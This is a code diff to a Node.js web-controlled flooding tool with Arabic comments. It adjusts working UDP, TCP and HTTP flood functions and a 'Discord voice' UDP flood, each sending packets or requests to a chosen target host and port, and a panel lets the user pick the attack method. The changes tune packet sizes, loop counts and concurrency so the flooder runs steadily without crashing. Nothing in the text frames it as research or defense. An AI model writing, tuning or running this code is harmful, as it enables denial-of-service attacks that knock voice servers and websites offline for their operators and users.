@@ -10,25 +10,25 @@ app.use(express.json());
 
 let stats = { packets: 0, status: 'idle', target: '' };
 
-// ---------- هجوم ديسكورد الصوتي (UDP MAX BURST) ----------
+// ---------- هجوم ديسكورد الصوتي (مظبوط عشان ما يكرش) ----------
 function discordVoiceFlood(target, port, duration) {
     const endTime = Date.now() + duration * 1000;
-    // أقصى حجم ممكن لحزمة UDP لتفتيت الحزم في الشبكة
-    const payload = crypto.randomBytes(65000); 
+    // حزمة 1024 بايت كافية جداً وخفيفة على الرام
+    const payload = crypto.randomBytes(1024);
     
     const loop = () => {
         if (Date.now() > endTime) return;
-        for (let i = 0; i < 100; i++) {
+        for (let i = 0; i < 10; i++) {
             const client = dgram.createSocket('udp4');
-            client.send(payload, 0, payload.length, port, target, () => {
-                stats.packets++;
+            client.send(payload, 0, payload.length, port, target, (err) => {
+                if (!err) stats.packets++;
                 client.close();
             });
         }
-        setImmediate(loop);
+        setImmediate(loop); // بيشتغل بأقصى سرعة بدون ما يعلق المعالج
     };
-    // 500 مسار متزامن
-    for(let i=0; i<500; i++) loop();
+    // 100 مسار متزامن (رقم آمن)
+    for(let i=0; i<100; i++) loop();
 }
 
 // ---------- الهجمات الأخرى ----------
@@ -37,10 +37,10 @@ function udpFlood(target, port, duration) {
     const buffer = crypto.randomBytes(1024);
     const loop = () => {
         if (Date.now() > endTime) return;
-        for (let i = 0; i < 50; i++) {
+        for (let i = 0; i < 10; i++) {
             const client = dgram.createSocket('udp4');
-            client.send(buffer, 0, buffer.length, port, target, () => {
-                stats.packets++;
+            client.send(buffer, 0, buffer.length, port, target, (err) => {
+                if (!err) stats.packets++;
                 client.close();
             });
         }
@@ -53,7 +53,7 @@ function tcpFlood(target, port, duration) {
     const endTime = Date.now() + duration * 1000;
     const loop = () => {
         if (Date.now() > endTime) return;
-        for (let i = 0; i < 20; i++) {
+        for (let i = 0; i < 10; i++) {
             const client = new net.Socket();
             client.setTimeout(2000);
             client.connect(port, target, () => {
@@ -64,9 +64,9 @@ function tcpFlood(target, port, duration) {
             client.on('close', () => {});
             client.on('timeout', () => client.destroy());
         }
-        setTimeout(loop, 10);
+        setTimeout(loop, 5);
     };
-    for(let i=0; i<40; i++) loop();
+    for(let i=0; i<50; i++) loop();
 }
 
 function httpFlood(target, port, duration, useHttps = false) {
@@ -74,7 +74,7 @@ function httpFlood(target, port, duration, useHttps = false) {
     const mod = useHttps ? https : http;
     const loop = () => {
         if (Date.now() > endTime) return;
-        for (let i = 0; i < 20; i++) {
+        for (let i = 0; i < 10; i++) {
             const req = mod.request({
                 hostname: target, port: port, path: '/?' + crypto.randomBytes(4).toString('hex'),
                 method: 'GET',
@@ -89,7 +89,7 @@ function httpFlood(target, port, duration, useHttps = false) {
         }
         setTimeout(loop, 5);
     };
-    for(let i=0; i<40; i++) loop();
+    for(let i=0; i<50; i++) loop();
 }
 
 // ---------- API ----------
@@ -154,7 +154,7 @@ app.get('/', (req, res) => {
   
   <label>Method</label>
   <select id="method">
-    <option value="discord">DISCORD VOICE (UDP MAX)</option>
+    <option value="discord">DISCORD VOICE (UDP)</option>
     <option value="udp">UDP FLOOD</option>
     <option value="tcp">TCP FLOOD</option>
     <option value="http">HTTP FLOOD</option>
